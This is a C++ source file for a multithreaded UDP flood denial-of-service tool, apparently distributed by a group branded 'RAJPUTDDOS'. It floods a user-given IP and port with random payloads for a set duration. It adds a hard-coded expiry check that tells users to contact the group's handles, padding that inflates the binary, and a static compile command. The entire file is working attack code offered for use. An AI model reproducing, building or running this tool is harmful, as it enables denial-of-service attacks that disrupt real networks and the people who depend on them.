#include <iostream>
#include <cstdlib>
#include <cstring>
#include <arpa/inet.h>
#include <pthread.h>
#include <ctime>
#include <csignal>
#include <vector>
#include <memory>
#ifdef _WIN32
    #include <windows.h>
    void usleep(int duration) { Sleep(duration / 2000); }
#else
    #include <unistd.h>
#endif

#define PAYLOAD_SIZE 40

// Padding to artificially increase binary size
char unused_padding[1024 * 1024 * 5]; // 5 MB of unused data

// Dummy function to further increase binary size
void dummy_function() {
    char large_array[1024 * 1024]; // 1 MB array
    for (int i = 0; i < sizeof(large_array); ++i) {
        large_array[i] = i % 256;
    }
}

// Expiration date constants
constexpr int EXPIRATION_YEAR = 2025; // Year
constexpr int EXPIRATION_MONTH = 2;  // Month (1-based)
constexpr int EXPIRATION_DAY = 1;    // Day of the month

// Check if binary has expired
void check_expiration() {
    // Get the current date
    std::time_t now = std::time(nullptr);
    std::tm* current_time = std::localtime(&now);

    int current_year = current_time->tm_year + 1900; // Convert from years since 1900
    int current_month = current_time->tm_mon + 1;   // Convert to 1-based month
    int current_day = current_time->tm_mday;

    // Check if the current date surpasses the expiration date
    if (current_year > EXPIRATION_YEAR ||
        (current_year == EXPIRATION_YEAR && current_month > EXPIRATION_MONTH) ||
        (current_year == EXPIRATION_YEAR && current_month == EXPIRATION_MONTH && current_day > EXPIRATION_DAY)) {
        std::cerr << "Binary expired. Contact @RAJPUTDDOS @RAJPUTDDOS\n";
        exit(1);
    }
}

class Attack {
public:
    Attack(const std::string& ip, int port, int duration)
        : ip(ip), port(port), duration(duration) {}

    void generate_payload(char *buffer, size_t size) {
        for (size_t i = 0; i < size; i++) {
            buffer[i * 4] = '\\';
            buffer[i * 4 + 1] = 'x';
            buffer[i * 4 + 2] = "0123456789abcdef"[rand() % 16];
            buffer[i * 4 + 3] = "0123456789abcdef"[rand() % 16];
        }
        buffer[size * 4] = '\0';
    }

    void attack_thread() {
        int sock;
        struct sockaddr_in server_addr;
        time_t endtime;
        
        char payload[PAYLOAD_SIZE * 4 + 1];
        generate_payload(payload, PAYLOAD_SIZE);

        if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
            perror("Socket creation failed");
            pthread_exit(NULL);
        }

        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(port);
        server_addr.sin_addr.s_addr = inet_addr(ip.c_str());

        endtime = time(NULL) + duration;
        while (time(NULL) <= endtime) {
            ssize_t payload_size = strlen(payload);
            if (sendto(sock, payload, payload_size, 0, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }

        close(sock);
    }

private:
    std::string ip;
    int port;
    int duration;
};

void handle_sigint(int sig) {
    std::cout << "\nStopping attack...\n";
    exit(0);
}

void usage() {
    std::cout << "Usage: ./rajput ip port duration threads\n";
    exit(1);
}

int main(int argc, char *argv[]) {
    check_expiration(); // Check if the binary is expired

    if (argc != 5) {
        usage();
    }

    std::string ip = argv[1];
    int port = std::atoi(argv[2]);
    int duration = std::atoi(argv[3]);
    int threads = std::atoi(argv[4]);

    std::signal(SIGINT, handle_sigint);

    std::vector<pthread_t> thread_ids(threads);
    std::vector<std::unique_ptr<Attack>> attacks;

    std::cout << "Attack started on " << ip << ":" << port << " for " << duration << " seconds with " << threads << " threads\n";

    for (int i = 0; i < threads; i++) {
        attacks.push_back(std::make_unique<Attack>(ip, port, duration));
        
        if (pthread_create(&thread_ids[i], NULL, [](void* arg) -> void* {
            Attack* attack = static_cast<Attack*>(arg);
            attack->attack_thread();
            return nullptr;
        }, attacks[i].get()) != 0) {
            perror("Thread creation failed");
            exit(1);
        }
        std::cout << "Launched thread with ID: " << thread_ids[i] << "\n";
    }

    dummy_function(); // Call dummy function to ensure it's included in the binary

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    std::cout << "Attack finished. Join @RAJPUTDDOS1 @RAJPUTDDOS\n";
    return 0;
}

//    g++ -std=c++14 ddosfiles.cpp -o spidy -pthread -O0 -g -static

//    g++ -std=c++14 ddosfiles.cpp -o spidy -pthread -O0 -g -static

//    g++ -std=c++14 ddosfiles.cpp -o spidy -pthread -O0 -g -static